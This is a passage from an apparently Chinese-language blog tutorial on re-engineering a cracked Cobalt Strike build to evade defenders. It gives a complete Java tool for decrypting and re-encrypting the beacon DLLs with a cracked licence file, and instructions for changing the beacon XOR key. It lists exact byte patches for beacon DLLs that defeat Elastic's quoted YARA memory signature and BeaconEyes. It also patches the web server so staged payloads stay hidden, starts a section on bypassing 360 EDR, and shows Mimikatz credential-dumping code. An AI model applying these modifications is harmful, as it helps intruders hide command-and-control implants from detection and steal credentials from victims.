class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] beacon_obfuscate(<span class="hljs-type">byte</span>[] var0) &#123;<br>    <span class="hljs-type">byte</span>[] var1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[var0.length];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var2 &lt; var0.length; ++var2) &#123;<br>        var1[var2] = (<span class="hljs-type">byte</span>)(var0[var2] ^ &#123;Key&#125;);<br>    &#125;<br>    <span class="hljs-keyword">return</span> var1;<br>&#125;<br></code></pre></td></tr></table></figure><p>修改<code>&#123;Key&#125;</code>随便一个10进制数字即可，后面dll中改成对应的16进制数字。</p><h2 id="Dll修改"><a href="#Dll修改" class="headerlink" title="Dll修改"></a>Dll修改</h2><p>使用CrackSleeve把dll进行解密:<a href="https://github.com/ca3tie1/CrackSleeve/">https://github.com/ca3tie1/CrackSleeve/</a></p><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h3><p>目前破解方式五花八门,最多的是内置的<code>resources/cobaltstrike.auth</code>文件,可能使用原有的CrackSleeve会有问题 解密失败 这里附赠一份解密<code>resources/cobaltstrike.auth</code>的脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> common.*;<br><span class="hljs-keyword">import</span> dns.SleeveSecurity;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Enumeration;<br><span class="hljs-keyword">import</span> java.util.jar.JarEntry;<br><span class="hljs-keyword">import</span> java.util.jar.JarFile;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CrackSleeve</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] OriginKey40 = &#123;<span class="hljs-number">27</span>, -<span class="hljs-number">27</span>, -<span class="hljs-number">66</span>, <span class="hljs-number">82</span>, -<span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">92</span>, <span class="hljs-number">51</span>, <span class="hljs-number">85</span>, -<span class="hljs-number">114</span>, -<span class="hljs-number">118</span>, <span class="hljs-number">28</span>, -<span class="hljs-number">74</span>, <span class="hljs-number">103</span>, -<span class="hljs-number">53</span>, <span class="hljs-number">6</span> &#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] OriginKey41 = &#123;-<span class="hljs-number">128</span>, -<span class="hljs-number">29</span>, <span class="hljs-number">42</span>, <span class="hljs-number">116</span>, <span class="hljs-number">32</span>, <span class="hljs-number">96</span>, -<span class="hljs-number">72</span>, -<span class="hljs-number">124</span>, <span class="hljs-number">65</span>, -<span class="hljs-number">101</span>, -<span class="hljs-number">96</span>, -<span class="hljs-number">63</span>, <span class="hljs-number">113</span>, -<span class="hljs-number">55</span>, -<span class="hljs-number">86</span>, <span class="hljs-number">118</span> &#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] OriginKey42 = &#123;-<span class="hljs-number">78</span>, <span class="hljs-number">13</span>, <span class="hljs-number">72</span>, <span class="hljs-number">122</span>, -<span class="hljs-number">35</span>, -<span class="hljs-number">44</span>, <span class="hljs-number">113</span>, <span class="hljs-number">52</span>, <span class="hljs-number">24</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">43</span>, -<span class="hljs-number">93</span>, -<span class="hljs-number">82</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">89</span>, -<span class="hljs-number">96</span>&#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] OriginKey43 = &#123;<span class="hljs-number">58</span>, <span class="hljs-number">68</span>, <span class="hljs-number">37</span>, <span class="hljs-number">73</span>, <span class="hljs-number">15</span>, <span class="hljs-number">56</span>, -<span class="hljs-number">102</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">61</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">67</span>, -<span class="hljs-number">41</span>, <span class="hljs-number">88</span>, -<span class="hljs-number">83</span>, <span class="hljs-number">43</span>, -<span class="hljs-number">103</span>&#125;;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] CustomizeKey = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">DecDir</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Resource/Decode/sleeve&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">EncDir</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Resource/Encode/sleeve&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (args.length == <span class="hljs-number">0</span> || args[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;-h&quot;</span>) || args[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;--help&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;UseAge: CrackSleeve OPTION [key]&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;Options:&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\tdecode\t\tDecode sleeve files&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\tencode\t\tEncode sleeve files&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\tkey\t\tCustomize key string for encode sleeve files&quot;</span>);<br>            System.exit(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br><span class="hljs-comment">//        if (option.toLowerCase().equals(&quot;encode&quot;))</span><br><span class="hljs-comment">//        &#123;</span><br><span class="hljs-comment">//            if (args.length &lt;= 1)&#123;</span><br><span class="hljs-comment">//                System.out.println(&quot;[-] Please enter key.&quot;);</span><br><span class="hljs-comment">//                System.exit(0);</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//            String CustomizeKeyStr = args[1];</span><br><span class="hljs-comment">//            if (CustomizeKeyStr.length() &lt; 16)</span><br><span class="hljs-comment">//            &#123;</span><br><span class="hljs-comment">//                System.out.println(&quot;[-] key length must be 16.&quot;);</span><br><span class="hljs-comment">//                System.exit(0);</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//            System.out.println(&quot;Init Key: &quot;+CustomizeKeyStr.substring(0,16));</span><br><span class="hljs-comment">//            CustomizeKey = CustomizeKeyStr.substring(0,16).getBytes();</span><br><span class="hljs-comment">//        &#125;</span><br><br><br>        <span class="hljs-type">CrackSleeve</span> <span class="hljs-variable">Cracker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CrackSleeve</span>();<br>        <span class="hljs-comment">// 使用正版key初始化SleeveSecurity中的key</span><br>        <span class="hljs-keyword">if</span> (option.equals(<span class="hljs-string">&quot;decode&quot;</span>))&#123;<br>            CrackSleevedResource.Setup(OriginKey43);<br>            Cracker.DecodeFile();<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (option.equals(<span class="hljs-string">&quot;encode&quot;</span>))&#123;<br>            <span class="hljs-comment">//CrackSleevedResource.Setup(CustomizeKey);</span><br>            CrackSleevedResource.Setup(OriginKey43);<br>            Cracker.EncodeFile();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">DecodeFile</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 文件保存目录</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">saveDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-built_in">this</span>.DecDir);<br>        <span class="hljs-keyword">if</span> (!saveDir.isDirectory())<br>            saveDir.mkdirs();<br><br>        <span class="hljs-comment">// 获取jar文件中sleeve文件夹下的文件列表</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResource(<span class="hljs-string">&quot;sleeve&quot;</span>).getPath();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">jarPath</span> <span class="hljs-operator">=</span> path.substring(<span class="hljs-number">5</span>,path.indexOf(<span class="hljs-string">&quot;!/&quot;</span>));<br>            Enumeration&lt;JarEntry&gt; jarEnum = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JarFile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(jarPath)).entries();<br>            <span class="hljs-keyword">while</span> (jarEnum.hasMoreElements())<br>            &#123;<br>                <span class="hljs-type">JarEntry</span> <span class="hljs-variable">Element</span> <span class="hljs-operator">=</span> jarEnum.nextElement();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">FileName</span> <span class="hljs-operator">=</span> Element.getName();<br>                <span class="hljs-keyword">if</span> (FileName.indexOf(<span class="hljs-string">&quot;sleeve&quot;</span>)&gt;=<span class="hljs-number">0</span> &amp;&amp; !FileName.equals(<span class="hljs-string">&quot;sleeve/&quot;</span>)) &#123;<br>                    System.out.print(<span class="hljs-string">&quot;[+] Decoding &quot;</span>+FileName+<span class="hljs-string">&quot;......&quot;</span>);<br>                    <span class="hljs-type">byte</span>[] decBytes = CrackSleevedResource.DecodeResource(FileName);<br>                    <span class="hljs-keyword">if</span> (decBytes.length &gt; <span class="hljs-number">0</span>) &#123;<br>                        System.out.println(<span class="hljs-string">&quot;Done.&quot;</span>);<br>                        CommonUtils.writeToFile(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(saveDir,<span class="hljs-string">&quot;../&quot;</span>+FileName),decBytes);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                        System.out.println(<span class="hljs-string">&quot;Fail.&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">EncodeFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">// 文件保存目录</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">saveDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-built_in">this</span>.EncDir);<br>        <span class="hljs-keyword">if</span> (!saveDir.isDirectory())<br>            saveDir.mkdirs();<br><br>        <span class="hljs-comment">// 获取解密文件列表</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">decDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-built_in">this</span>.DecDir);<br>        File[] decFiles = decDir.listFiles();<br>        <span class="hljs-keyword">if</span> (decFiles.length == <span class="hljs-number">0</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;[-] There&#x27;s no file to encode, please decode first.&quot;</span>);<br>            System.exit(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (File file : decFiles)&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> decDir.getPath()+<span class="hljs-string">&quot;/&quot;</span>+file.getName();<br>            System.out.print(<span class="hljs-string">&quot;[+] Encoding &quot;</span> + file.getName() + <span class="hljs-string">&quot;......&quot;</span>);<br>            <span class="hljs-type">byte</span>[] encBytes = CrackSleevedResource.EncodeResource(filename);<br>            <span class="hljs-keyword">if</span> (encBytes.length &gt; <span class="hljs-number">0</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;Done.&quot;</span>);<br>                CommonUtils.writeToFile(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(saveDir,file.getName()),encBytes);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>                System.out.println(<span class="hljs-string">&quot;Fail.&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CrackSleevedResource</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> CrackSleevedResource singleton;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">SleeveSecurity</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SleeveSecurity</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Setup</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] paramArrayOfbyte)</span> &#123;<br><span class="hljs-comment">//        singleton = new CrackSleevedResource(paramArrayOfbyte);</span><br>        <span class="hljs-comment">//从文件读取Key解密</span><br>          singleton = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CrackSleevedResource</span>(CommonUtils.readResource(<span class="hljs-string">&quot;resources/cobaltstrike.auth&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] DecodeResource(String paramString) &#123;<br>        <span class="hljs-keyword">return</span> singleton._DecodeResource(paramString);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] EncodeResource(String paramString) &#123;<br>        <span class="hljs-keyword">return</span> singleton._EncodeResource(paramString);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">CrackSleevedResource</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] paramArrayOfbyte)</span> &#123;<br>        <span class="hljs-built_in">this</span>.data.registerKey(paramArrayOfbyte);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] _DecodeResource(String paramString) &#123;<br>        <span class="hljs-type">byte</span>[] arrayOfByte1 = CommonUtils.readResource(paramString);<br>        <span class="hljs-keyword">if</span> (arrayOfByte1.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.data.decrypt(arrayOfByte1);<br>        &#125;<br>        <span class="hljs-type">byte</span>[] arrayOfByte2 = CommonUtils.readResource(paramString);<br>        <span class="hljs-keyword">if</span> (arrayOfByte2.length == <span class="hljs-number">0</span>) &#123;<br>            CommonUtils.print_error(<span class="hljs-string">&quot;Could not find sleeved resource: &quot;</span> + paramString + <span class="hljs-string">&quot; [ERROR]&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            CommonUtils.print_stat(<span class="hljs-string">&quot;Used internal resource: &quot;</span> + paramString);<br>        &#125;<br>        <span class="hljs-keyword">return</span> arrayOfByte2;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] _EncodeResource(String paramString)&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">fileResource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(paramString);<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">fileStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(fileResource);<br>            <span class="hljs-keyword">if</span> (fileStream != <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-type">byte</span>[] fileBytes = CommonUtils.readAll(fileStream);<br>                <span class="hljs-keyword">if</span> (fileBytes.length &gt; <span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-type">byte</span>[] fileEncBytes = <span class="hljs-built_in">this</span>.data.encrypt(fileBytes);<br>                    <span class="hljs-keyword">return</span> fileEncBytes;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>将cobaltstrike.jar和CrackSleeve.java放一起</li><li>编译(<code>javac -encoding UTF-8 -classpath cobaltstrike.jar CrackSleeve.java</code>)</li><li>解密文件(<code>java -classpath cobaltstrike.jar;./ CrackSleeve decode</code>) # windows命令行执行</li></ol><p>Alt+T进行关键字搜索：2Eh</p><p><img src="/img/image-20211107222017434.png" alt="image-20211107222017434"></p><p><img src="/img/image-20211107222039265.png" alt="image-20211107222039265"></p><p>直接修改xor的值，先Change byte找到2E修改，再Apply pathes to input file保存。（别忘记保存）</p><p><img src="/img/image-20211107222223636.png" alt="image-20211107222223636"></p><p>需要修改的dll：beacon.dll、beacon.x64.dll、dnsb.dll、dnsb.x64.dll、pivot.dll、pivot.x64.dll、extc2.dll、extc2.x64.dll</p><p>再CrackSleeve加密dll，最后，把encode目录下的dll，放到idea项目目录中重新编译打包。</p><p>进行测试uri地址虽说仍旧可以请求到，但内容已经无法用nmap脚本解密出来，同理也可躲避空间搜索引擎的识别：</p><p><img src="/img/image-20211107233719344.png" alt="image-20211107233719344"></p><h2 id="0x04-修改规则规避BeaconEyes"><a href="#0x04-修改规则规避BeaconEyes" class="headerlink" title="0x04 修改规则规避BeaconEyes"></a>0x04 修改规则规避BeaconEyes</h2><p>由于CS的本身特性(反射注入DLL等),在内存中肯定是有或多或少的特征,这里我们以<code>sleep_mask</code>为例,在<code>CS 3.12版本后</code>推出了<strong>混淆与睡眠</strong>内存规避的功能。</p><p>我们知道在环境中查找Beacon存在的一种方法是扫描所有正在运行的进程以查找指示攻击活动的常见字符串。例如，搜索<code>ReflectiveLoader</code>字符串将找到不会更改此导出函数名称的内存驻留反射DLL,因此为了对内存扫描进行一定规避,其引入了混淆与睡眠</p><blockquote><p>其功能可以理解为:Beacon 是（主要）单线程信标。它请求任务，执行这些任务，然后进入睡眠状态。Beacon 大部分时间都在休眠。当启用<code>obfuscate-and-sleep</code>时，Beacon会在进入睡眠状态之前在内存中混淆自身。当代理醒来时，它会自己恢复到原来的状态。</p></blockquote><p>在<a href="https://www.cobaltstrike.com/blog/cobalt-strike-3-12-blink-and-youll-miss-it/">CS官方介绍</a>中给出了如下的使用方法:<br><img src="/img/image-20220428172348166.png" alt="img"></p><p>只需要在profile文件中设置<code>sleep_mask=&quot;true&quot;</code>即可开启睡眠混淆功能,这里我们分别来看一下开启前和开启后的内存变化,这里使用<code>Process Hacker</code>找到对应Beacon在内存中的值,此时是开启<code>sleep_mask</code>,可以知道该数据是被加密过的<br>当我们存在Sleep时,并且设置<code>sleep_mask=true</code></p><blockquote><p>注意这里有可能因为profile设置了<code>cleanup</code>选项，而将内存中的Stage释放掉了,导致出现没法在内存中找到对应的值的情况</p></blockquote><p>然而在<a href="https:">https://www.elastic.co/cn/blog/detecting-cobalt-strike-with-memory-signatures</a>中提到,Beacon 的 obfuscate-and-sleep 选项只会混淆字符串和数据，而负责进行加解密的代码部分不会混淆，且在内存中可以被标记出来,因此当我们拥有这一段数据时便能够在内存中进行匹配从而找到</p><p>附yara规则:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yara">rule cobaltstrike_beacon_4_2_decrypt<br>&#123;<br>meta:<br>    author = &quot;Elastic&quot;<br>    description = &quot;Identifies deobfuscation routine used in Cobalt Strike Beacon DLL version 4.2.&quot;<br>strings:<br>    $a_x64 = &#123;4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03&#125;<br>    $a_x86 = &#123;8B 46 04 8B 08 8B 50 04 83 C0 08 89 55 08 89 45 0C 85 C9 75 04 85 D2 74 23 3B CA 73 E6 8B 06 8D 3C 08 33 D2&#125;<br>condition:<br>     any of them<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-3修改"><a href="#4-3修改" class="headerlink" title="4.3修改"></a>4.3修改</h3><h4 id="32位dll"><a href="#32位dll" class="headerlink" title="32位dll"></a>32位dll</h4><p>地址位：<code>10009FBB</code></p><p><code>6A 00</code> 修改为<code>6A 09</code>（00修改为任意）</p><p><img src="/img/image-20211111165257545.png" alt="image-20211111165257545"></p><h4 id="64位dll"><a href="#64位dll" class="headerlink" title="64位dll"></a>64位dll</h4><p>地址位：<code>000000001800186C3</code></p><p>beacon.x64.dll里面的指令是<code>xor edx, edx</code>，修改为<code>mov edx, esi</code></p><p><img src="/img/image-20211111165321033.png" alt="image-20211111165321033"></p><h3 id="4-4修改"><a href="#4-4修改" class="headerlink" title="4.4修改"></a>4.4修改</h3><h4 id="32位dll-1"><a href="#32位dll-1" class="headerlink" title="32位dll"></a>32位dll</h4><p>地址位：<code>1000A0B9</code></p><p><code>6A 00</code> 修改为<code>6A 09</code>（00修改为任意）</p><p><img src="/img/image-20211112104322791.png" alt="image-20211112104322791"></p><h4 id="64位dll-1"><a href="#64位dll-1" class="headerlink" title="64位dll"></a>64位dll</h4><p>地址位：<code>000000018001879B</code></p><p>beacon.x64.dll里面的指令是<code>xor edx, edx</code>，修改为<code>mov edx, esi</code></p><p><img src="/img/image-20211112105408975.png" alt="image-20211112105408975"></p><p>使用重新加密：<code>java -classpath cobaltstrike.jar;./ CrackSleeve encode</code></p><p><img src="/img/image-20211111173148579.png" alt="image-20211111173148579"></p><p><img src="/img/image-20211112124415835.png" alt="image-20211112124415835"></p><h2 id="0x05-CS修复错误路径泄漏Stage"><a href="#0x05-CS修复错误路径泄漏Stage" class="headerlink" title="0x05 CS修复错误路径泄漏Stage"></a>0x05 CS修复错误路径泄漏Stage</h2><p>修改文件</p><ul><li>cloudstrike&#x2F;webserver.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!uri.startsWith(<span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.processResponse(uri, method, header, param, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">&quot;404 Not Found&quot;</span>, <span class="hljs-string">&quot;text/plain&quot;</span>, <span class="hljs-string">&quot;&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>4.4修改</p><p><img src="/img/image-20220428183136311.png" alt="image-20220428183136311"></p><p>4.3 修改</p><p><img src="/img/image-20220428183222044.png" alt="image-20220428183222044"></p><h2 id="0x06-ByPass-360晶核"><a href="#0x06-ByPass-360晶核" class="headerlink" title="0x06 ByPass 360晶核"></a>0x06 ByPass 360晶核</h2><h4 id="功能模块分析"><a href="#功能模块分析" class="headerlink" title="功能模块分析"></a>功能模块分析</h4><p>Cobalt Strike常见的功能如：<strong>logonpasswords</strong>，<strong>hashdump</strong>等功能在jar代码实现是<strong>beacon.TaskBeacon.class</strong>。</p><p>以<strong>logonpasswords</strong>为例，最终定位到如下代码处。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public void <span class="hljs-constructor">LogonPasswords()</span><br> &#123;<br>   <span class="hljs-constructor">MimikatzSmall(<span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span>)</span>;<br> &#125;<br><br> public void <span class="hljs-constructor">MimikatzSmall(String <span class="hljs-params">paramString</span>)</span><br> &#123;<br>   <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; this.bids.length; i++)<br>   &#123;<br>     BeaconEntry localBeaconEntry = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DataUtils</span>.</span></span>get<span class="hljs-constructor">Beacon(<span class="hljs-params">this</span>.<span class="hljs-params">data</span>, <span class="hljs-params">this</span>.<span class="hljs-params">bids</span>[<span class="hljs-params">i</span>])</span>;<br>     <span class="hljs-keyword">if</span> (localBeaconEntry.is64<span class="hljs-literal">()</span>) &#123;<br>       <span class="hljs-keyword">new</span> <span class="hljs-constructor">MimikatzJobSmall(<span class="hljs-params">this</span>, <span class="hljs-params">paramString</span>)</span>.spawn(this.bids<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>, <span 